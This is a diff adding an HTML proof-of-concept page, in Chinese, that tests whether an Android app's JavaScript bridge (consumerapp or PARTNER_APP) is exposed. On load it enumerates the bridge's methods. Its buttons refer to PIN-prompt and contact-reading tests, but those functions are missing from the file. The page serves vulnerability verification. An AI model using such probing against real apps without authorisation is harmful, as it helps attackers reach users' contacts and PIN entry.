@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JS Bridge 漏洞验证 (PoC)</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        button { width: 100%; padding: 15px; margin: 10px 0; background-color: #ff4d4f; color: white; border: none; border-radius: 5px; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <h2>JS Bridge 敏感接口暴露验证</h2>
+    <p>当前页面域名: <script>document.write(window.location.href);</script></p>
+    
+    <button onclick="testTriggerPin()">1. 尝试触发 PIN 码输入弹窗</button>
+    <button onclick="testObtainContact()">2. 尝试获取通讯录</button>
+
+    <hr>
+    <h3>日志输出:</h3>
+    <div id="log" style="background: #f5f5f5; padding: 10px; border-radius: 5px; min-height: 100px; white-space: pre-wrap;"></div>
+
+    <script>
+ // 检测并列出 Android Bridge 对象的所有可用方法
+function probeAndroidBridge() {
+    const logDiv = document.getElementById('log');
+    const bridge = window.consumerapp || window.PARTNER_APP;
+    
+    if (!bridge) {
+        logDiv.innerText += "[-] 未检测到 Bridge 对象\n";
+        return;
+    }
+    
+    logDiv.innerText += `\n[== 开始探测对象属性与方法 ==]\n`;
+    
+    // 获取对象上的所有键
+    const properties = Object.getOwnPropertyNames(bridge);
+    if (properties.length === 0) {
+        // 有些低版本环境可能需要遍历 prototype 或者直接 for...in
+        for (let key in bridge) {
+            properties.push(key);
+        }
+    }
+    
+    if (properties.length === 0) {
+        logDiv.innerText += "[!] 无法通过标准反射获取方法名，可能被混淆或限制，尝试直接调用常见变形...\n";
+    } else {
+        properties.forEach(prop => {
+            try {
+                const type = typeof bridge[prop];
+                logDiv.innerText += `-> [${type}] ${prop}\n`;
+            } catch (e) {
+                logDiv.innerText += `-> [未知] ${prop} (读取失败)\n`;
+            }
+        });
+    }
+    logDiv.innerText += `[== 探测结束 ==]\n`;
+}
+
+// 页面加载时自动执行探测
+window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(probeAndroidBridge, 1000); 
+});
+    </script>
+</body>
+</html>
